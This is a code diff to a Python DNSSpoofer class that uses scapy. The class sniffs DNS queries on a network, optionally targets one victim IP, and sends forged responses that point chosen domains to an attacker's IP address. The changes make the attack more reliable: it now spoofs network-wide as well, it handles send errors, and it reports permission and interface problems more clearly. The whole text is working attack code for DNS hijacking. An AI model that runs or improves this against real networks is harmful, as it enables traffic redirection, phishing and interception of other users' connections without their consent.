@@ -132,11 +132,14 @@ class DNSSpoofer:
             if not packet.haslayer(DNS):
                 return
             
+            # Get IP layer for victim filtering
+            if not packet.haslayer(IP):
+                return
+            
+            source_ip = packet[IP].src
+            
             # If victim_ip is specified, only respond to queries from that victim
             if self.victim_ip:
-                if not packet.haslayer(IP):
-                    return
-                source_ip = packet[IP].src
                 if source_ip != self.victim_ip:
                     return  # Ignore queries from other IPs
             
@@ -150,16 +153,19 @@ class DNSSpoofer:
                     
                     # Check if it's one of our target domains
                     if self._is_target_domain(query_name):
-                        victim_info = f"from {self.victim_ip}" if self.victim_ip else "from network"
+                        victim_info = f"from {self.victim_ip}" if self.victim_ip else f"from {source_ip}"
                         self.logger.info(f"🎯 Intercepted DNS query {victim_info} for {query_name}")
                         
                         # Create and send fake response
                         fake_response = self._create_fake_dns_response(packet, query_name)
                         if fake_response:
-                            from scapy.all import send
-                            send(fake_response, verbose=False, iface=self.interface)
-                            self.packets_spoofed += 1
-                            self.logger.info(f"✅ Sent fake DNS response: {query_name} → {self.attacker_ip}")
+                            try:
+                                from scapy.all import send
+                                send(fake_response, verbose=False, iface=self.interface)
+                                self.packets_spoofed += 1
+                                self.logger.info(f"✅ Sent fake DNS response: {query_name} → {self.attacker_ip}")
+                            except Exception as send_err:
+                                self.logger.error(f"Error sending DNS response: {send_err}")
         
         except Exception as e:
             self.logger.error(f"Error in packet callback: {e}")
@@ -188,7 +194,10 @@ class DNSSpoofer:
     def _sniff_loop(self):
         """Sniff DNS packets in loop"""
         try:
-            self.logger.info(f"Starting DNS sniffer on interface {self.interface} for port 53")
+            iface_info = f"interface {self.interface}" if self.interface else "default interface"
+            victim_info = f" (victim={self.victim_ip})" if self.victim_ip else " (network-wide)"
+            self.logger.info(f"Starting DNS sniffer on {iface_info} for port 53{victim_info}")
+            
             sniff(
                 iface=self.interface,
                 filter="udp port 53",
@@ -197,8 +206,12 @@ class DNSSpoofer:
                 stop_filter=lambda _: not self.is_running,
                 timeout=None
             )
-        except Exception as e:
-            self.logger.error(f"Sniff error: {e}")
+        except PermissionError as e:
+            self.logger.error(f"❌ Permission denied: {e}")
+            self.logger.error("DNS spoofing requires root/admin privileges. Please run as root on Linux or Admin on Windows.")
+            self.is_running = False
+        except OSError as e:
+            self.logger.error(f"❌ OS Error (bad interface?): {e}")
             self.logger.info("Trying fallback: sniffing all UDP packets on port 53")
             try:
                 sniff(
@@ -210,7 +223,11 @@ class DNSSpoofer:
                     timeout=None
                 )
             except Exception as e2:
-                self.logger.error(f"Fallback sniff also failed: {e2}")
+                self.logger.error(f"❌ Fallback sniff also failed: {e2}")
+                self.is_running = False
+        except Exception as e:
+            self.logger.error(f"❌ Sniff error: {e}")
+            self.is_running = False
         finally:
             self.logger.info("DNS spoof sniff loop stopped")
     
